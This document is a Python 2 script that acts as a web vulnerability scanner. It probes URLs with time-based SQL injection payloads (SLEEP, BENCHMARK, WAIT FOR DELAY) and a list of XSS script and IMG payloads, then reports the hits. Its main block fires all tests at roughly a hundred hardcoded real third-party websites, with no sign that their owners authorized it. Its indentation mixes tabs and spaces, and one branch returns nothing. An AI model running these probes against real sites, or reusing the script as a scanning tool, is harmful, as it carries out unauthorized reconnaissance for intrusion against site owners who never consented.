# -*- coding: utf-8 -*-

#Imports
from lxml import html
import bcolors
import os
import urllib
import urllib2
import getproxy
import time
import socket

#Constants
headers = { 'User-Agent' : 'Mozilla/5.0' }

def sql_error_scan(url,v = False) :
	req = urllib2.Request(url + "'", None, headers)

	try :
		src = urllib2.urlopen(req).read()
	except:
		return False

        if ("SQL syntax" in str(src) or "SQL Syntax" in str(src) or "SQL SYNTAX" in str(src)) :
                if (v) :
                         bcolors.printGreen("[+]Found 'SQL syntax' reference")
                return True
        elif ("SQL error" in str(src) or "SQL Error" in str(src) or "SQL ERROR" in str(src)) :
                if (v) :
                        bcolors.printGreen("[+]Found 'SQL Error' reference")
                return True
	elif ("sql_" in str(src)) :
		if (v) :
			bcolors.printGreen("[+]Found 'sql_' reference")
        else :
                return False

def sql_time_scan(url, v = False) :
	sleepCommands = ["-SLEEP(5000)", 
			 "-BENCHMARK(1000000000000000, rand())",
			 "; WAIT FOR DELAY '10:00:00'",
			 "'BEGIN DBMS_LOCK.SLEEP(15); END;--" ]
	
	#Get normal load-time
	req = urllib2.Request(url, None, headers)
	timeStart = time.time()
	try :
		response = urllib2.urlopen(req)
	except :
		return False

	latency = time.time() - timeStart
	if (v):
		print("[*]Latency is " + str(latency))
	socket.setdefaulttimeout(2*latency)
	######################

	for test in sleepCommands :
		req = urllib2.Request(url + test, None, headers)
		try :
			response = urllib2.urlopen(req)
		except socket.timeout :
			if (v) :
				bcolors.printGreen("[+] Time-based sql vulnerability found!")
			return True
		except:
			continue
	return False

def xss_vuln_scan(url, v = False) :
	#source: http://breakthesecurity.cysecurity.org/2012/02/complete-cross-site-scriptingxss-cheat-sheets-part-1.html
	xssStrings = ['>"><script>alert("1VULN")</script>&',
		      '<script>alert(“1VULN”)</script>',
		      '<script>alert(‘1VULN’)</script>',
		      '“><script>alert(“1VULN”)</script>',
		      '<script>alert(/1VULN”)</script>',
		      '<script>alert(/1VULN/)</script>',
		      '<ScRiPt>alert("1VULN")</sCriPt>',
		      '<IMG SRC=jAVasCrIPt:alert(‘1VULN’)>',
		      '<IMG SRC=”javascript:alert(‘1VULN’);”>',
		      '<IMG SRC=javascript:alert(&quot;1VULN&quot;)>',
		      '<IMG SRC=javascript:alert(‘1VULN’)',
		      '<<SCRIPT>alert(“1VULN”);//<</SCRIPT>']

	for test in xssStrings :
		req = urllib2.Request(url + test, None, headers)
		try :
			response = urllib2.urlopen(req)
		except :
			continue
		src = response.read()

		if ('<script>alert("1VULN")' in str(src) or '<IMG SRC=javascript:alert' in str(src)) :
			if (v) :
				bcolors.printGreen("[+]Found XSS vulnerability!")
			return True
	return False

def run_tests(links, testLevel = 1, v = False) :
	vulnUrls = []
	if (links == [] or links == None) :
		bcolors.printFail("[-]Invalid input parameters! Exiting...")
		return
	for link in links :
		if (testLevel > 0) :
		#Basic SQLi
			if(sql_error_scan(link, v)) :
				vulnUrls.append((link, "SQLi"))	
		if (testLevel > 1) :
		#Time based SQLi
			if(sql_time_scan(link, v)) :
				vulnUrls.append((link, "SQLiT"))
		if (testLevel > 2) :
		#XSS
			if(xss_vuln_scan(link, v)) :
				vulnUrls.append((link, "XSS"))
	return vulnUrls
if __name__ == '__main__' :
	testURLS = [u'http://php.net/manual/en/domnodelist.item.php', u'http://www.ushmm.org/wlc/en/article.php?ModuleId=10005143', u'http://www.ushmm.org/wlc/en/article.php?ModuleId=10005059', u'https://www.mediawiki.org/wiki/Manual:Article.php', u'https://github.com/woothemes/woocommerce/blob/master/templates/content-product.php', u'http://www.zabbix.com/product.php', u'https://wordpress.org/support/topic/plugin-woocommerce-unable-to-customize-archive-productphp', u'http://lotharek.pl/product.php?pid=96', u'http://www.electrovoice.com/product.php?id=1004', u'http://www.foveon.com/article.php?a=67', u'http://www.clivemaund.com/article.php?art_id=68', u'https://www.barnabasfund.org/news/archives/article.php?ID_news_items=342', u'http://deathpenalty.org/article.php?id=83', u'http://deathpenalty.org/article.php?id=56', u'http://www.thecus.com/product.php?PROD_ID=76', u'http://help.directadmin.com/item.php?id=354', u'https://www.bullydog.com/product.php?ID=499', u'http://www.htmlgoodies.com/beyond/php/article.php/3907521', u'http://www.htmlgoodies.com/primers/html/article.php/3478131', u'http://www.silverstonetek.com/product.php?pid=210', u'http://www.furmansound.com/product.php?id=DISCONTINUED', u'http://www.camero-tech.com/product.php?ID=40', u'https://www.meldaproduction.com/plugins/product.php?id=MFreeEffectsBundle', u'http://store.valvesoftware.com/product.php?i=MU422', u'http://www.wotancraft.com/product.php?pid=130', u'http://www.corpwatch.org/article.php?id=376', u'http://www.groklaw.net/article.php?story=20130818120421175', u'http://schema-creator.org/product.php', u'http://www.geneticsandsociety.org/article.php?id=6527', u'http://science.oregonstate.edu/ocean.productivity/standard.product.php', u'http://convivea.com/product.php?id=2', u'http://www.ameritron.com/Product.php?productid=ALS-1300', u'http://www.hy-gain.com/Product.php?productid=AV-640', u'http://www.pelican.com/mobile/product.php?Case=C07030', u'http://www.lightcon.com/products/product.php?ID=28', u'http://gikir.com/product.php', u'http://www.ddmf.eu/product.php?id=3', u'http://www.afca.com/article/article.php?id=2342', u'http://www.audiodamage.com/hardware/product.php?pid=ADM06', u'http://www.tikkun.org/article.php/jul_09_gibbs', u'http://www.tubus.com/product.php?xn=17', u'http://www.xigmatek.com/product.php?productid=123', u'http://www.contempaesthetics.org/newvolume/pages/article.php?articleID=214', u'http://www.blokart.com/product.php', u'http://www.mfjenterprises.com/Product.php?productid=MFJ-993B', u'http://www.mfjenterprises.com/Product.php?productid=MFJ-998RT', u'http://www.apifishcare.com/product.php?id=580', u'https://uk.webuy.com/product.php?sku=SPS4500GB001', u'http://pluto.jhuapl.edu/News-Center/News-Article.php?page=20150917', u'http://www.onestops.info/article.php?article_id=62', u'http://forecast.weather.gov/product.php?site=NWS&issuedby=OKX&product=PNS', u'http://forecast.weather.gov/product.php?site=lot&product=afd&issuedby=lot&glossary=1', u'http://www.kinolorber.com/video.php?id=1084', u'http://www.soaw.org/article.php?id=96', u'http://www.advantech.com/industrial-automation/webaccess/product.php', u'http://stackoverflow.com/questions/32061387/add-woocommerce-order-notes-field-to-cart-php-single-product-php', u'http://www.cja.org/article.php?id=863', u'http://www.deepfreeze.it/article.php?a=quickdirty', u'http://www.antec.com/product.php?id=2768&pid=17&lan=us', u'http://www.eclipse.org/articles/article.php?file=Article-Understanding-Layouts/index.html', u'https://www.ultraedit.com/store/product.php?productid=16137', u'http://reference.elgg.org/default_2navigation_2menu_2elements_2item_8php_source.html', u'http://greenschools.net/article.php?id=99', u'http://assess.com/xcart/product.php?productid=415', u'http://www.qsan.com/en/product.php?act=view&id=8', u'http://picturinghistory.gc.cuny.edu/item.php?item_id=180', u'http://www.developer.com/design/article.php/10925_3684656_1', u'http://www.nissi-beach.com/article.php?id=18', u'http://www.stardoll.com/help/article.php?sectionId=18&articleId=13', u'http://podcast.rthk.hk/podcast/item.php?pid=78', u'http://www.aeonastron.com/product.php', u'http://www.universityworldnews.com/article.php?story=20150225145423462', u'http://www.illustratorspartnership.org/01_topics/article.php?searchterm=00185', u'http://webmasters.stackexchange.com/questions/72347/removing-product-php-in-url-using-htaccess', u'http://jobstar.org/tools/career/spec-car.php', u'http://www.shimano-sportcamera.com/us/product.php', u'http://www.rdlnet.com/product.php?page=162', u'http://www.mfin.gov.rs/pages/article.php?id=7161', u'https://www.nutrivene.com/product.php?id=20', u'http://www.allstreamcentre.com/visiting/directions/car.php', u'http://www.stophiphop.com/modules/news/article.php?storyid=184', u'http://www.jvc.se/product.php?id=KD-R301E', u'https://ithemes.com/codex/page/Exchange_Theme_Templates:_content-confirmation/elements/product.php', u'https://ithemes.com/codex/page/Exchange_Theme_Templates:_content-store/elements/product.php', u'https://ithemes.com/codex/page/Exchange_Theme_Templates:_super-widget-product.php', u'https://sv-se.facebook.com/Artbycamillaedfors/posts/715165818553167', u'https://www.facebook.com/no.for.WDS2019.in.China/posts/886773478069496', u'http://www.hsrcpress.ac.za/product.php?productid=2279&freedownload=1', u'http://www.gotenece.com/product.php?productID=4153', u'http://www.pcfma.com/m/product.php?product_id=17', u'http://www.vmcs.org/forum/viewtopic.php?f=1&t=6299', u'http://www.yad2.co.il/Cars/Car.php', u'https://www.zen-cart.com/showthread.php?50479-Done-v1-4-0-Hardcoded-text-found-quot-admin-product-php-quot', u'http://www.scip.ch/sv/?vuldb.73873', u'http://docs.virtuemart.net/api-vm2/d6/d8b/models_2product_8php.html', u'http://www.millerwelds.com/products/tig/product.php?model=M00152', u'http://www.tactic.net/site/product.php?Product_number=02129&category=find&lang=SWE', u'http://www.dgr.se/Product.php?id=9013', u'http://www.neuero.se/product.php?productID=267', u'http://www.pwss.se/product.php?productid=6500&cat=1350&page=1', u'http://www.psxcare.com/product.php?xProd=868', u'http://www.phonescoop.com/articles/article.php?a=16463', u'http://www.waxdog.se/product.php?id_product=693', u'http://www.waxdog.se/product.php?id_product=694', u'http://www.waxdog.se/product.php?id_product=133', u'http://www.bigapplesoccer.com/article.php', u'http://delicesdefrance.se/product.php?id_product=173']
	import sys
	reload(sys)
	sys.setdefaultencoding('utf-8')
	res = run_tests(testURLS, 3, True)
	print(str(res))

